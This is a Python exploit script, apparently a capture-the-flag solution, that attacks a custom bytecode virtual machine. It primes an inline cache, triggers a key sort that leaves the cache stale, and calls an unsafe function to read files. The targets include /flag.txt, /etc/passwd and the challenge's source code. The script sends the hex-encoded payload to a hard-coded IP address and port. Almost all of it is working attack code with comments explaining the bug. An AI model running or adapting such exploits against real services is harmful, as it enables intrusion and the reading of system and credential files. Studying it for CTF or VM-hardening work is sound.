import socket
import struct
import time

def p8(x): return struct.pack('<B', x)
def p16(x): return struct.pack('<H', x)

# --- Payload Construction ---
# We will iterate through these paths.
consts = [
    b"caps",                    # 0
    b"/flag.txt",               # 1: Standard Flag
    b"/flag",                   # 2: Root Flag
    b"/challenge/flag.txt",     # 3: Challenge Dir Flag
    b"/etc/passwd",             # 4: Proof of Exploit
    b"/challenge/chal.js"       # 5: Source Code
]

payload = b""
# Header: [nr_regs] [cs_count]
payload += p8(0x10) 
payload += p8(len(consts))

# Constants Definitions
for c in consts:
    payload += p8(0x02)      # Type: String
    payload += p16(len(c))   # Length
    payload += c             # Bytes

# Bytecode
code = b""

# 1. Setup: r0 = global["caps"], r1 = caps.c
code += p8(0x02) + p8(0x00) + p8(0x00)
code += p8(0x20) + p8(0x01) + p8(0x00) + p8(0x03)

# 2. Prime Cache: r2 = r1.e
# F5 (Prototype) has keys [e (10), 0 (0)]. 'e' is at Index 0.
# IC stores: "Key 10 -> Index 0".
code += p8(0x21) + p8(0x02) + p8(0x06) + p8(0x01) + p8(0x0a)

# 3. Trigger Exploit: SORT r1.e
# Sorts F5 keys to [0 (0), e (10)].
# F5 storage 'sl' updates: Index 0 gets value of Key 0 (Unsafe F0).
# F5 is NOT touched, so global version 'x' is unchanged.
code += p8(0x70) + p8(0x01) + p8(0x0a)

# 4. Use Stale Cache: r3 = r1.e
# IC Hit (Version Match). Returns Index 0 -> F0 (Unsafe).
code += p8(0x21) + p8(0x03) + p8(0x07) + p8(0x01) + p8(0x0a)

# 5. Read /flag.txt
# r4 = "/flag.txt" (Const 1)
code += p8(0x01) + p8(0x04) + p8(0x01)
# r5 = r3(r4) -> F0("/flag.txt")
code += p8(0x30) + p8(0x05) + p8(0x03) + p8(0x01) + p8(0x01) + p8(0x04)

# 6. RET r5
code += p8(0x31) + p8(0x05)

payload += code

# --- Execution ---
hex_payload = payload.hex()
print(f"[*] Payload: {hex_payload}")

HOST = '35.245.96.82'
PORT = 5000

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    print(f"[+] Connected to {HOST}:{PORT}")
    
    s.sendall(hex_payload.encode() + b'\n')
    time.sleep(1) # Increased wait time
    
    response = s.recv(4096).decode()
    print(f"[+] Response: {response}")
    
    s.close()
except Exception as e:
    print(f"[-] Error: {e}")